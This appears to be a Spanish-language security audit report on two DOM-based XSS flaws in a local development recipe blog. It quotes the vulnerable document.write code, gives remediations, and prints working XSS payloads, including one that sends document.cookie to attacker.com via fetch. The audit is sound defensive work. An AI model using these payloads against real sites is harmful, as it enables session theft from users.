# Informe de Auditoría de Seguridad - XSS
**Objetivo:** http://web.dev.local:8082  
**Fecha:** 2026-04-27T15:38:17  
**Tipo de análisis:** Cross-Site Scripting (XSS)  
**Herramienta:** Manual + curl

---

## Resumen Ejecutivo

Se han identificado **2 vulnerabilidades XSS de tipo DOM-Based** en la aplicación web "Blog de Recetas" alojada en http://web.dev.local:8082. Ambas vulnerabilidades se originan por el uso de `document.write()` con datos del usuario (parámetros GET de la URL) sin ningún proceso de sanitización o codificación.

---

## Vulnerabilidades Encontradas

### 1. DOM-Based XSS en parámetro `search`

- **Tipo:** DOM-Based XSS (Reflected)
- **Severidad:** Alta (CVSS: 7.4)
- **Parámetro vulnerable:** `search` (GET)
- **Endpoint:** `http://web.dev.local:8082/?search=<PAYLOAD>`

**Código vulnerable:**
```javascript
const searchTerm = urlParams.get('search');
// Sin sanitización:
document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
```

El valor del parámetro `search` se obtiene directamente de la URL y se concatena sin escapar dentro de `document.write()`, lo que permite inyectar HTML y JavaScript arbitrario.

**Payload de explotación:**
```
http://web.dev.local:8082/?search=<img src=x onerror=alert('XSS_search')>
```

**Payload alternativo (script tag):**
```
http://web.dev.local:8082/?search=</strong><script>alert(document.cookie)</script>
```

**Impacto:** Un atacante puede robar cookies de sesión, redirigir usuarios a sitios maliciosos, realizar keylogging, o realizar acciones en nombre de la víctima.

---

### 2. DOM-Based XSS Almacenado (localStorage) en parámetros `name` y `comment`

- **Tipo:** DOM-Based XSS (Stored via localStorage)
- **Severidad:** Alta (CVSS: 7.4)
- **Parámetros vulnerables:** `name` y `comment` (GET)
- **Endpoint:** `http://web.dev.local:8082/?name=<PAYLOAD>&comment=<PAYLOAD>`

**Código vulnerable:**
```javascript
const name = urlParams.get('name');
const comment = urlParams.get('comment');

// Se almacena sin sanitizar en localStorage
comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
localStorage.setItem('comments', JSON.stringify(comments));

// Se renderiza sin sanitizar via document.write()
document.write('<div class="comment-author">' + c.name + '</div>');
document.write('<div>' + c.comment + '</div>');
```

Los valores se persisten en `localStorage` sin sanitización y luego se renderizan directamente en el DOM vía `document.write()` cada vez que la página carga.

**Payload de explotación:**
```
http://web.dev.local:8082/?name=Atacante&comment=<img src=x onerror=alert('XSS_stored')>
```

**Payload de exfiltración de cookies:**
```
http://web.dev.local:8082/?name=Hacker&comment=<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
```

**Impacto:** Dado que el payload se persiste en `localStorage`, el XSS se ejecuta en cada visita del usuario afectado, sin necesidad de que vuelva a hacer click en un enlace malicioso.

---

## Demostración de Explotación

### PoC 1 - XSS Reflected en búsqueda
```
URL: http://web.dev.local:8082/?search=<img+src=x+onerror=alert('XSS')>
Resultado: El navegador ejecuta alert('XSS') al cargar la página
```

### PoC 2 - XSS Almacenado en comentarios
```
Paso 1: Visitar http://web.dev.local:8082/?name=A&comment=<img+src=x+onerror=alert('XSS')>
Paso 2: El payload se guarda en localStorage
Paso 3: En cada carga posterior de la página, el XSS se ejecuta automáticamente
```

---

## Análisis de Causa Raíz

La aplicación utiliza `document.write()` para renderizar contenido dinámico directamente desde parámetros de URL controlados por el usuario, sin aplicar ninguna de las siguientes medidas de protección:

1. Sanitización de entrada (input sanitization)
2. Codificación de salida HTML (output encoding)
3. Content Security Policy (CSP)
4. Validación de tipo/formato de datos

---

## Recomendaciones

1. **Usar textContent en lugar de innerHTML/document.write:**
   ```javascript
   // Vulnerable
   document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
   
   // Seguro
   const p = document.createElement('p');
   const strong = document.createElement('strong');
   strong.textContent = searchTerm;
   p.appendChild(strong);
   ```

2. **Codificar la salida HTML:**
   ```javascript
   function escapeHtml(str) {
       return str.replace(/&/g,'&amp;').replace(/</g,'&lt;')
                 .replace(/>/g,'&gt;').replace(/"/g,'&quot;')
                 .replace(/'/g,'&#039;');
   }
   ```

3. **Implementar Content Security Policy (CSP):**
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'
   ```

4. **Evitar el uso de `document.write()`**: Esta función es inherentemente peligrosa cuando se usa con datos de usuario.

5. **Sanitizar datos antes de almacenar en localStorage** y al leerlos.

---

## Conclusión

La aplicación presenta vulnerabilidades XSS críticas que permiten la ejecución de código JavaScript arbitrario en el navegador de las víctimas. La vulnerabilidad en el parámetro `search` es explotable mediante un simple enlace malicioso (reflected XSS), mientras que la vulnerabilidad en los comentarios persiste entre sesiones (stored XSS via localStorage). Ambas vulnerabilidades deben ser corregidas de forma inmediata.

---

**Estado:** VULNERABLE  
**Vulnerabilidades encontradas:** 2  
**Vulnerabilidades explotadas:** 2 (PoC demostrado)  
**Riesgo global:** ALTO
